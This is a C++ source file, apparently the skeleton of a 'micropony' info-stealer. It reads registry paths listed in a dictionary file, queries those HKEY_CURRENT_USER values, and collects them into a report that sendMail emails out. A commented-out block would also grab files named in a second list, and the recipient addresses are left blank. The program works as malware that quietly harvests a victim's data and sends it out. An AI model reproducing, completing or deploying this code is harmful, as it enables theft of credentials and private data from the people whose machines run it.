#include "stdafx.h"
#include "micropony.h"

int main()
{
	Report* report = new Report;
	List* list = new List;

	CSimpleIniA ini;
	ini.SetUnicode();
	ini.LoadFile("reg.dic");
	ini.GetAllSections(list->sections);

	for (auto& pSection : list->sections)
	{
		ini.GetAllKeys(pSection.pItem, list->keys);

		for (auto& pPath : list->keys)
		{
			ini.GetAllValues(pSection.pItem, pPath.pItem, list->values);

			for (auto& pParam : list->values)
			{
				std::string value = getKeyValue(HKEY_CURRENT_USER, pPath.pItem, pParam.pItem);
				std::cout << value;
				report->paths.push_back(pPath.pItem);
				report->params.push_back(pParam.pItem);
				report->values.push_back(value);
			}
		}
	}

	//List* listFile = parseList("file.dic");
	//LPCWSTR nameFile, catalog;

	//for (auto &pCatalog : listFile->paths) {
	//	for (auto &pFile : listFile->params) {
			//nameFile, catalog = grabFile(pCatalog, pFile);

	//		report->names.push_back(nameFile);
	//		report->catalogs.push_back(catalog);
	//	}
	//}

	// Send report curl in mail

	static const char* email = "";
	static const char* emailEmergency = "";

	std::string message("");

	for (auto str : report->paths)
		message += str + ',';

	message += '\n';

	for (auto str : report->params)
		message += str + ',';

	message += '\n';

	for (auto str : report->values)
		message += str + ',';

	sendMail(message);

    return 0;
}

